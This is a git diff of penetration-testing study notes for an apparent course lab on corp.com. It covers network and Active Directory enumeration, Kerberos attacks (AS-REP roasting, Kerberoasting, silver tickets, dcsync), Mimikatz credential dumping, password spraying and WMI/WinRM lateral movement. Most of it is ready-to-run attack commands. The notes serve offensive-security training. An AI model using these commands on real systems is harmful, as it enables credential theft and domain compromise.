@@ -72,13 +72,13 @@ nslookup -type=TXT info.megacorptwo.com 192.168.50.151
     * axfr: zone transfer
 * -D \<file name containing potential subdomain strings>
 
+Automate DNS enumeration
+
 ```bash
 dnsrecon -d megacorpone.com -t std
 dnsrecon -d megacorpone.com -D ~/list.txt -t brt
 dnsrecon -d megacorpone.com -t axfr
 ```
-
-Automate DNS enumeration with **DNSEnum**
 
 ```bash
 dnsenum megacorpone.com
@@ -94,7 +94,7 @@ dnsenum megacorpone.com
 nc -nv -u -z -w 1 192.168.50.149 120-123
 ```
 
-Sweep for hosts with an open port 445 on the /24 subnet
+Sweep for hosts with an open port 445
 
 ```bash
 for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
@@ -112,7 +112,7 @@ done
 echo "Done"
 ```
 
-Windows ping sweep
+Ping sweep on Windows
 
 ```bat
 for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.
@@ -124,7 +124,7 @@ Checks if an IP responds to ICMP and whether a specified TCP port is open
 Test-NetConnection -Port 445 192.168.50.151
 ```
 
-Scan the first 1024 ports on a Windows machine
+Scan the first 1024 ports
 
 ```pwsh
 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
@@ -1391,9 +1391,6 @@ whoami /groups
 net user
 net user steve
 net localgroup
-
-net group "Management Department" stephanie /add /domain
-net group "Management Department" stephanie /del /domain
 ```
 
 ```pwsh
@@ -2187,7 +2184,9 @@ netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP di
 Delete the firewall rule we just created and the port forward
 
 ```bat
-netsh advfirewall firewall delete rule name="port_forward_ssh_2222"netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
+netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
+
+netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
 ```
 
 # Tunneling Through Deep Packet Inspection
@@ -2655,11 +2654,11 @@ ls -l /usr/share/metasploit-framework/scripts/resource
 
 # Active Directory Introduction and Enumeration
 
-Members of **Domain Admins** are among the most privileged objects in the domain.
+If an attacker compromises a member of **Domain Admins** group (often referred to as domain administrators), they essentially gain complete control over the domain.
 
 An AD instance can host more than one domain in a domain tree or multiple domain trees in a domain forest.
 
-While there is a Domain Admins group for each domain in the forest, members of the **Enterprise Admins** group are granted full control over all the domains in the forest and have Administrator privilege on all DCs.
+While there is a "Domain Admins" group for each domain in the forest, members of the **Enterprise Admins** group are granted full control over all the domains in the forest and have Administrator privilege on all DCs.
 
 ## Active Directory - Manual Enumeration
 
@@ -2669,25 +2668,32 @@ Leverage an **Active Directory Services Interface (ADSI)** (a set of interfaces 
 
 `LDAP://HostName[:PortNumber][/DistinguishedName]`
 
-- The **Hostname** can be a computer name, IP address or a domain name. E.g., `corp.com` domain. Note that a domain may have multiple DCs. To make our enumeration as accurate as possible, the DC that holds the most updated information, aka the **Primary Domain Controller (PDC)**. There can be only one PDC in a domain. To find the PDC, we need to find the DC holding the **PdcRoleOwner** property.
+- The **Hostname** can be a computer name, IP address or a domain name. E.g., `corp.com` domain. A domain may have multiple DCs. The DC that holds the most updated information is the **Primary Domain Controller (PDC)**. There can be only one PDC in a domain. => find the DC holding the **PdcRoleOwner** property.
 
 - The **PortNumber** is optional. It will automatically choose the port based on whether or not we are using an SSL connection. If we come across a domain using non-default ports, we may need to manually add this to the script.
 
 - **DistinguishedName** (DN) is a part of the LDAP path. A DN is a name that uniquely identifies an object in AD, including the domain itself.
 
-Objects in AD (or other directory services). E.g., stephanie domain user, a user object within the `corp.com` domain:
+E.g., stephanie is a user object within the `corp.com` domain:
 
 `CN=Stephanie,CN=Users,DC=corp,DC=com`
 
-- CN: **Common Name**, which specifies the identifier of an object in the domain. If we added `CN=Users` to our LDAP path, we would restrict ourselves by only being able to search objects within that given container.
+- CN: **Common Name**, specifies the identifier of an object in the domain. If we added `CN=Users` to our LDAP path, we would restrict ourselves by only being able to search objects within that given container.
 
-- "DC": **Domain Component** when we are referring to a **Distinguished Name**. The Domain Component represents the top of an LDAP tree or the Distinguished Name of the domain itself, `DC=corp,DC=com`.
+- "DC": **Domain Component** represents the top of an LDAP tree or the Distinguished Name of the domain itself, `DC=corp,DC=com`.
 
 ```bat
 net user /domain
 net user jeffadmin /domain
 net group /domain
 net group "Sales Department" /domain
+
+net group "Management Department" stephanie /add /domain
+net group "Management Department" stephanie /del /domain
+```
+
+```pwsh
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 ```
 
 `.\enumeration.ps1`
@@ -2749,6 +2755,7 @@ function LDAPSearch {
 ```pwsh
 Import-Module .\function.ps1
 
+# User enumeration
 LDAPSearch -LDAPQuery "(samAccountType=805306368)"
 
 LDAPSearch -LDAPQuery "(objectclass=group)"
@@ -2758,34 +2765,39 @@ foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) { $group.p
 $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
 $sales.properties.member
 
-$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))"
-$group.properties.member
-
 LDAPSearch -LDAPQuery "serviceprincipalname=*http*"
 ```
 
 ```pwsh
 Import-Module .\PowerView.ps1
+```
 
+```pwsh
 Get-NetDomain
 Get-NetUser | select cn,pwdlastset,lastlogon
-Get-NetGroup | select cn enumerate groups
+Get-NetGroup | select cn
 Get-NetGroup "Sales Department" | select member
+Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
 ```
 
 ## Manual Enumeration - Expanding our Repertoire
 
-PowerView's `Find-LocalAdminAccess` command scans the network to determine if our current user has administrative permissions on any computers in the domain. The command relies on the **OpenServiceW** function, which will connect to the **Service Control Manager (SCM)** on the target machines. The SCM essentially maintains a database of installed services and drivers on Windows computers. PowerView will attempt to open this database with the **SC_MANAGER_ALL_ACCESS** access right, which require administrative privileges, and if the connection is successful, PowerView will deem that our current user has administrative privileges on the target machine.
+PowerView's `Find-LocalAdminAccess` command scans the network to determine if our current user has administrative permissions on any computers in the domain. The command relies on the **OpenServiceW** function, which will connect to the **Service Control Manager (SCM)** on the target machines. The SCM essentially maintains a database of installed services and drivers on Windows computers. PowerView will attempt to open this database with the **SC_MANAGER_ALL_ACCESS** access right, which require administrative privileges, and if the connection is successful => our current user has administrative privileges on the target machine.
 
-To know which user is logged in to which computer, **historically**, the 2 most reliable Windows APIs that are **NetWkstaUserEnum** and **NetSessionEnum**. The former requires administrative privileges, while the latter does not.
+The command supports parameters such as Computername and Credentials. Run it without parameters to spray the environment to find possible local administrative access on computers under the current user context.
+
+```pwsh
+Find-LocalAdminAccess
+```
+
+To know which user is logged in to which computer, **historically**, the 2 most reliable Windows APIs are **NetWkstaUserEnum** and **NetSessionEnum**. The former requires administrative privileges, while the latter does not.
 
 PowerView's `Get-NetSession` command uses the **NetWkstaUserEnum** and **NetSessionEnum** APIs under the hood. Due to permissions, **NetSessionEnum** will not be able to obtain this type of information on default Windows 11 (returns an "Access is denied"):
 
-- According to the documentation, there are 5 possible query levels: 0,1,2,10,502.
-  - Level 0 only returns the name of the computer establishing the session.
-  - Levels 1 and 2 return more information but require administrative privileges
+- According to the documentation, there are 5 possible query levels: 0, 1, 2, 10, 502.
   - Levels 10 and 502, both should return information such as the name of the computer and name of the user establishing the connection.
-- By default, PowerView uses query level 10 with NetSessionEnum
+
+By default, PowerView uses query level 10 with NetSessionEnum.
 
 The permissions required to enumerate sessions with NetSessionEnum are defined in the **SrvsvcSessionInfo** registry key, which is located in the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity` hive.
 
@@ -2793,18 +2805,10 @@ The permissions required to enumerate sessions with NetSessionEnum are defined i
 Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
 ```
 
-- The BUILTIN group, NT AUTHORITY group, CREATOR OWNER and APPLICATION PACKAGE AUTHORITY are defined by the system, and do not allow NetSessionEnum to enumerate this registry key from a remote standpoint.
-- The long string in the end of the output is a **capability SID**. A capability SID is an unforgeable token of authority that grants a Windows component or a Universal Windows Application access to various resources. However, it will not give us remote access to the registry key of interest.
-- In older Windows versions, **Authenticated Users** were allowed to access the registry hive and obtain information from the SrvsvcSessionInfo key. However, following the least privilege principle, regular domain users should not be able to acquire this information within the domain.
-
+A **capability SID** (e.g. S-1-15-3-1024-1065365936-...-4053264122-3456934681) is an unforgeable token of authority that grants a Windows component or a Universal Windows Application access to various resources.
+- In older Windows versions (before Windows Server 2019 build 1809), **Authenticated Users** were allowed to access the registry hive and obtain information from the SrvsvcSessionInfo key. However, following the least privilege principle, regular domain users should not be able to acquire this information within the domain.
 
 ```pwsh
-Import-Module .\PowerView.ps1
-
-Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
-
-Find-LocalAdminAccess
-
 Get-NetSession -ComputerName files04 -Verbose
 ```
 
@@ -2818,7 +2822,7 @@ It is also enabled by default on later Windows **Server** Operating Systems such
 .\PsLoggedon.exe \\files04
 ```
 
-**services** launched by the system itself run in the context of a **Service Account**, i.e., isolated applications can use a set of predefined service accounts, such as LocalSystem, LocalService, and NetworkService.
+**Services** launched by the system itself run in the context of a **Service Account**, i.e., isolated applications can use a set of predefined service accounts, such as LocalSystem, LocalService, and NetworkService.
 
 For more complex applications, a **domain user account** may be used to provide the needed context while still maintaining access to resources inside the domain.
 
@@ -2828,22 +2832,20 @@ When applications like Exchange, MS SQL, or IIS are integrated into AD, a unique
 
 Larger applications like MS SQL and Microsoft Exchange often required server redundancy when running to guarantee availability, but Managed Service Accounts did not support this. To remedy this, **Group Managed Service Accounts** were introduced with Windows Server 2012, but this requires that domain controllers run Windows Server 2012 or higher.
 
-=> some organizations may still rely on basic Service Accounts.
+Obtain a clear list of SPNs
 
-Obtain the **IP address and port number** of applications running on servers integrated with AD (enumerating all SPNs in the domain)
+```pwsh
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+```
 
-* -L \<user>: search for a specific SPNs by iis_service user
+If we previously discovered the iis_service user
 
 ```pwsh
 setspn -L iis_service
 ```
 
-Enumerate all the accounts in the domain
-
 ```pwsh
-Import-Module .\PowerView.ps1
-
-Get-NetUser -SPN | select samaccountname,serviceprincipalname
+nslookup.exe web04.corp.com
 ```
 
 An object in AD may have a set of permissions applied to it with multiple **Access Control Entries (ACE)**. These ACEs make up the **Access Control List (ACL)**. Each ACE defines whether access to the specific object is allowed or denied.
@@ -2859,29 +2861,29 @@ AD includes permission types that can be used to configure an ACE:
 - **ForceChangePassword**: Password change for object
 - **Self (Self-Membership)**: Add ourselves to for example a group
 
-
-
 Enumerate a user to determine which ACEs are applied to it, the output lists Security Identifiers (SID), and ActiveDirectoryRights property describes the type of permission applied to the object
 
+To determine which ACEs are applied to user stephanie
+
 ```pwsh
-Import-Module .\PowerView.ps1
-
 Get-ObjectAcl -Identity stephanie
+```
 
+The **ActiveDirectoryRights** property describes the type of permission applied to the object. To find out who has the permission, we need to convert the **SecurityIdentifier** value.
+
+```pwsh
 Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
 ```
 
 Filter the ActiveDirectoryRights property
 
 ```pwsh
-Import-Module .\PowerView.ps1
-
 Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+
+"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104" | Convert-SidToName
 ```
 
 ```pwsh
-Import-Module .\PowerView.ps1
-
 Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft
 ```
 
@@ -2892,13 +2894,14 @@ Historically, system administrators often changed local workstation passwords th
 Find the shares in the domain, add the `-CheckShareAccess` flag to display shares only available to us
 
 ```pwsh
-Import-Module .\PowerView.ps1
-
 Find-DomainShare
 ```
 
+Older domain policy file contains an encrypted password for the local built-in Administrator account (cpassword)
+
 ```pwsh
 ls \\dc1.corp.com\sysvol\corp.com\
+cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
 ```
 
 Decrypts a given GPP encrypted string
@@ -2907,25 +2910,18 @@ Decrypts a given GPP encrypted string
 gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 ```
 
-Discover the domain controller's hostname 
-
-```
-nslookup
-> set type=all
-> _ldap._tcp.dc._msdcs.sandbox.local
-```
-
 ## Active Directory - Automated Enumeration
 
 ```pwsh
 Import-Module .\Sharphound.ps1
 
-. .\SharpHound.ps1
+Get-Help Invoke-BloodHound
 
-Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp"
 ```
 
-`http://localhost:7474` default credentials (neo4j as both username and password)
+The Neo4j service should be available via the web interface at
+`http://localhost:7474`, default credentials (neo4j as both username and password)
 
 ```bash
 sudo neo4j start
@@ -2959,7 +2955,7 @@ Pre-built queries:
 **NTLM authentication** is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos.
 
 The NTLM authentication protocol consists of seven steps:
-1. In the first step, the computer calculates a cryptographic hash, called the **NTLM hash**, from the user's **password**.
+1. The computer calculates a cryptographic hash, called the **NTLM hash**, from the user's **password**.
 
 2. Next, the client computer sends the **username** to the server, which returns a random value called the **nonce** or challenge.
 
@@ -2973,7 +2969,7 @@ The NTLM authentication protocol consists of seven steps:
 
 While NTLM authentication works via a challenge-and-response paradigm, Windows-based Kerberos authentication uses a ticket system.
 
-- With NTLM authentication, the client starts the authentication process with the application server itself,
+- With NTLM authentication, the client starts the authentication process with the application server itself.
 
 - Kerberos client authentication involves the use of a domain controller in the role of a Key Distribution Center (KDC). The client starts the authentication process with the KDC and not the application server. A KDC service runs on each domain controller and is responsible for session tickets and temporary session keys to users and computers.
 
@@ -2987,7 +2983,7 @@ While NTLM authentication works via a challenge-and-response paradigm, Windows-b
    - The session key is encrypted using the user's password hash and may be decrypted by the client and then reused.
    - The TGT contains information regarding the user, the domain, a timestamp, the IP address of the client, and the session key. To avoid tampering, the TGT is encrypted by a secret key (**NTLM hash** of the **krbtgt** account) known only to the KDC and cannot be decrypted by the client.
 
-4. Once the client has received the session key and the TGT, the KDC considers the client authentication complete. By default, the TGT will be valid for ten hours, after which a renewal occurs. This renewal does not require the user to re-enter their password.
+4. Once the client has received the session key and the TGT, the KDC considers the client authentication complete. By default, the TGT will be valid for 10 hours, after which a renewal occurs. This renewal does not require the user to re-enter their password.
 
 5. When the user wishes to access resources of the domain, such as a network share or a mailbox, it must again contact the KDC. This time, the client constructs a **Ticket Granting Service Request (TGS-REQ)** packet that consists of the current user and a timestamp encrypted with the session key, the name of the resource, and the encrypted TGT.
 
@@ -3013,7 +3009,7 @@ While NTLM authentication works via a challenge-and-response paradigm, Windows-b
 
 Since Microsoft's implementation of Kerberos makes use of single sign-on, password hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space.
 
-An effective defensive technique to prevent tools such as Mimikatz from extracting hashes is to enable additional **LSA Protection**. The LSA includes the LSASS process. By setting a registry key, Windows prevents reading memory from this process.
+To prevent tools such as Mimikatz from extracting hashes, enable additional **LSA Protection**. The LSA includes the LSASS process. By setting a registry key, Windows prevents reading memory from this process.
 
 - For AD instances at a functional level of Windows 2003, NTLM is the only available hashing algorithm.
 
@@ -3035,7 +3031,7 @@ sekurlsa::logonpasswords
 
 Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS.
 
-List the contents of the SMB share on WEB04. This will create and cache a service ticket.
+List the contents of the SMB share on WEB04. This will create and cache a service ticket
 
 ```pwsh
 dir \\web04.corp.com\backup
@@ -3051,7 +3047,7 @@ sekurlsa::tickets
 
 Microsoft provides the AD role Active Directory Certificate Services (AD CS) to implement a PKI, which exchanges digital certificates between authenticated users and trusted resources.
 
-If a server is installed as a Certification Authority (CA), it can issue and revoke digital certificates (and much more). 
+If a server is installed as a Certification Authority (CA), it can issue and revoke digital certificates. 
 
 For example, we could issue certificates for web servers to use HTTPS or to authenticate users based on certificates from the CA via Smart Cards.
 
@@ -3063,14 +3059,15 @@ The crypto module contains the capability to either patch the CryptoAPI function
 
 ### Password Spraying
 
+Obtain the account policy
+
 ```pwsh
 net accounts
 ```
 
-The DirectoryEntry constructor can be used with three arguments, including the LDAP path to the domain controller, the username, and the password
+The DirectoryEntry constructor can be used with 3 arguments, including the LDAP path to the domain controller, the username, and the password
 
 - If the password for the user account is correct, the object creation will be successful
-
 - If the password is invalid, no object will be created and we will receive an exception
 
 ```pwsh
@@ -3093,39 +3090,33 @@ Create a PowerShell script that enumerates all users and performs authentication
 .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
 ```
 
-Password spraying attack against AD users leverages SMB comes with some drawbacks. For every authentication attempt, a full SMB connection has to be set up and then terminated. => very noisy due to the generated network traffic and quite slow in comparison to other techniques.
+Password spraying attack against AD users leverages SMB comes with some drawbacks. For every authentication attempt, a full SMB connection has to be set up and then terminated. => noisy due to the generated network traffic and quite slow in comparison to other techniques.
 
 * --continue-on-success: avoid stopping at the first valid credential
 
 ```bash
 crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
-```
 
-```bash
 crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
 ```
 
 Password spraying attack based on obtaining a TGT.
 
-Using **kinit** on a Linux system, we can obtain and cache a Kerberos TGT. We'll need to provide a username and password to do this. If they are valid, we'll obtain a TGT.
+Using **kinit** on a Linux system, we can obtain and cache a Kerberos TGT. If a username and password are valid, we'll obtain a TGT. It only uses 2 UDP frames to determine whether the password is valid, as it sends only an AS-REQ and examines the response.
 
-It only uses 2 UDP frames to determine whether the password is valid, as it sends only an AS-REQ and examines the response.
-
-**kerbrute** is cross-platform, we can use it on Windows and Linux.
+**kerbrute** is cross-platform, we can use it on Windows and Linux. Make sure that the encoding of `usernames.txt` is ANSI. Use Notepad's Save As functionality to change the encoding.
 
 ```pwsh
 .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
 ```
 
-If you receive a network error, make sure that the encoding of `usernames.txt` is ANSI. Use Notepad's Save As functionality to change the encoding.
-
 ### AS-REP Roasting
 
-The first step of the authentication process via Kerberos is to send an AS-REQ. If the authentication is successful, the domain controller replies with an AS-REP containing the session key and TGT. This step is also commonly referred to as **Kerberos preauthentication** and prevents offline password guessing.
+The first step of the authentication process via Kerberos (commonly referred to as **Kerberos preauthentication**) is to send an AS-REQ. If the authentication is successful, the domain controller replies with an AS-REP containing the session key and TGT.
 
 Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response.
 
-By default, the AD user account option **Do not require Kerberos preauthentication** is disabled, meaning that Kerberos preauthentication is performed for all users.
+By default, the AD user account option **Do not require Kerberos preauthentication** is disabled => Kerberos preauthentication is performed for all users.
 
 ```bash
 impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
@@ -3141,25 +3132,27 @@ Perform AS-REP Roasting on Windows with Rubeus
 
 ```bash
 hashcat --help | grep -i "Kerberos"
-```
 
-```bash
 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
-To identify users with the enabled AD user account option **Do not require Kerberos preauthentication**, use PowerView's `Get-DomainUser` function with the option `-PreauthNotRequired` on Windows.
+To identify users with the enabled AD user account option **Do not require Kerberos preauthentication**,
+
+```pwsh
+Get-DomainUser -PreauthNotRequired
+```
 
 If we have **GenericWrite or GenericAll** permissions on another AD user account, we could reset their passwords, but this would lock out the user from accessing the account.
 
-=> modify the User Account Control value of the user to not require Kerberos preauthentication. This attack is known as **Targeted AS-REP Roasting**. Notably, we should reset the User Account Control value of the user once we've obtained the hash.
+=> To modify the User Account Control value of the user to not require Kerberos preauthentication, aka **Targeted AS-REP Roasting**. Notably, we should reset the User Account Control value of the user once we've obtained the hash.
 
 ### Kerberoasting
 
-When a user wants to access a resource hosted by a Service Principal Name (SPN), the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted via the password hash of the SPN.
+When a user wants to access a resource hosted by a Service Principal Name (SPN), the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted via the **password hash of the SPN**.
 
-When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.
+When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN. These checks are performed as a second step only when connecting to the service itself.
 
-These checks are performed as a second step only when connecting to the service itself. => If we know the SPN we want to target, we can request a service ticket for it from the domain controller.
+=> If we know the SPN to target, request a service ticket for it from the domain controller
 
 The service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing -> crack the cleartext password of the service account.
 
@@ -3169,20 +3162,20 @@ However, if the SPN runs in the context of a computer account, a managed service
 
 If we have GenericWrite or GenericAll permissions on another AD user account, we could reset the user's password but this may raise suspicion.
 
-=> set an SPN for the user, kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting.
+=> Set an SPN for the user, kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting.
 
 ```pwsh
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 ```
 
-If `impacket-GetUserSPNs` throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use `ntpdate` or `rdate` to do so.
+```bash
+hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+Perform Kerberoasting from Linux (If `impacket-GetUserSPNs` throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," synchronize the time of the Kali machine with the domain controller. We can use `ntpdate` or `rdate` to do so.)
 
 ```bash
 impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
-```
-
-```bash
-hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
 Request the service ticket (the registered SPN for the IIS web server in the domain is HTTP/CorpWebServer.corp.com)
@@ -3206,7 +3199,7 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~
 
 ### Silver Tickets
 
-The application on the server executing in the context of the service account checks the user's permissions from the group memberships included in the service ticket. However, the user and group permissions in the service ticket are not verified by the application in a majority of environments. In this case, the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash.
+The application on the server executing in the context of the service account checks the user's permissions from the group memberships included in the service ticket. However, the user and group permissions in the service ticket are not verified by the application in a majority of environments. The application blindly trusts the integrity of the service ticket since it is encrypted with a password hash.
 
 Privileged Account Certificate (PAC) validation is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller. Fortunately, service applications rarely perform PAC validation.
 
@@ -3218,7 +3211,7 @@ With the service account password or its associated NTLM hash at hand, we can fo
 
 If the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.
 
-In general, we need to collect the following three pieces of information to create a silver ticket:
+In general, 3 pieces of information to create a silver ticket are:
 
 •	SPN password hash
 •	Domain SID
@@ -3230,7 +3223,7 @@ Confirm that our current user has no access to the resource of the HTTP SPN mapp
 iwr -UseDefaultCredentials http://web04
 ```
 
-Since on this machine, iis_service has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service).
+Since on this machine, iis_service has an established session, we can use Mimikatz to retrieve the SPN password hash (NTLM hash of iis_service) "4d28cf5252d39971419580a51484ca09"
 
 Launch Mimikatz, use `privilege::debug` and `sekurlsa::logonpasswords` to extract cached AD credentials.
 
@@ -3251,9 +3244,12 @@ whoami /user
 * The SPN protocol (/service:)
 * NTLM hash of the SPN (/rc4:)
 * /ptt: Inject the forged ticket into the memory of the machine we execute the command on
+* /user: an existing domain user
 
 ```
 kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+
+exit
 ```
 
 From the perspective of the IIS application, the current user will be both the built-in local administrator (Relative Id: 500) and a member of several highly-privileged groups, including the Domain Admins group (Relative Id: 512)
@@ -3266,7 +3262,7 @@ klist
 iwr -UseDefaultCredentials http://web04
 ```
 
-Microsoft created a security patch to update the PAC structure from October 11, 2022: the extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist.
+Microsoft created a security patch to update the PAC structure from October 11, 2022: The extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist.
 
 ### Domain Controller Synchronization
 
@@ -3274,33 +3270,41 @@ In production environments, domains typically rely on more than one domain contr
 
 The domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.
 
-To launch such a replication, a user needs to have the **Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set** rights. By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.
+To launch such a replication, a user needs to have the **Replicating Directory Changes, Replicating Directory Changes All**, and **Replicating Directory Changes in Filtered Set** rights. By default, members of the **Domain Admins, Enterprise Admins, and Administrators** groups have these rights assigned.
 
-If we obtain access to a user account in one of these groups or with these rights assigned => **dcsync** attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.
+=> In a **dcsync** attack, we impersonate a domain controller. This allows us to request any user credentials (NTLM hash) from the domain.
 
 ```
-lsadump::dcsync /user:corp\Administrator
+lsadump::dcsync /user:corp\dave
 ```
 
-IP of the domain controller
+Crack NTLM hashes 
 
 ```bash
-impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"Brouha"@192.168.50.70
+hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+Perform the dcsync attack from Linux with 192.168.50.70 as the IP of the domain controller
+
+```bash
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"password"@192.168.50.70
 ```
 
 # Lateral Movement in Active Directory
 
-UAC remote restrictions does not apply to domain users => we can leverage full privileges while moving laterally with the techniques shown in this section.
+UAC remote restrictions does not apply to domain users.
 
 ## WMI and WinRM
 
-**WMI** is capable of creating processes via the **Create** method from the **Win32_Process **class. It communicates through Remote Procedure Calls (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data.
+**WMI** is capable of creating processes via the **Create** method from the **Win32_Process** class. It communicates through Remote Procedure Calls (RPC) over port **135** for remote access and uses a higher-range port (19152-65535) for session data.
 
-To create a process on the **remote target** via WMI, we need credentials of a member of the Administrators local group, which can also be a domain user.
+To create a process on the **remote target** via WMI, we need credentials of a member of the **Administrators** local group, which can also be a domain user.
 
 ```bat
 wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
 ```
+
+Translating this attack into PowerShell
 
 ```pwsh
 $username = 'jen';
@@ -3311,7 +3315,7 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 $options = New-CimSessionOption -Protocol DCOM
 $session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
 
-$command = 'powershell -nop -w hidden -e ...';
+$command = 'powershell -nop -w hidden -e <cmd>';
 
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
 ```
@@ -3329,16 +3333,16 @@ cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')
 print(cmd)
 ```
 
-**WinRM** can be employed for remote hosts management. WinRM is the Microsoft version of the WS-Management protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5985 for encrypted HTTPS traffic and port 5986 for plain HTTP.
+**WinRM** can be employed for remote hosts management. WinRM is the Microsoft version of the WS-Management protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port **5985** for encrypted HTTPS traffic and port 5986 for plain HTTP.
 
 WinRM is implemented in numerous built-in utilities, such as winrs (Windows Remote Shell).
 
-winrs only works for domain users. The domain user needs to be part of the Administrators or **Remote Management Users** group on the target host.
+winrs only works for domain users. The domain user needs to be part of the **Administrators or Remote Management Users** group on the target host.
 
 ```bat
 winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
 
-winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e ..."
+winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e <cmd>"
 ```
 
 PowerShell also has WinRM built-in capabilities called **PowerShell remoting**
@@ -3350,7 +3354,6 @@ $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 
 New-PSSession -ComputerName 192.168.50.73 -Credential $credential
-
 Enter-PSSession 1
 ```
 
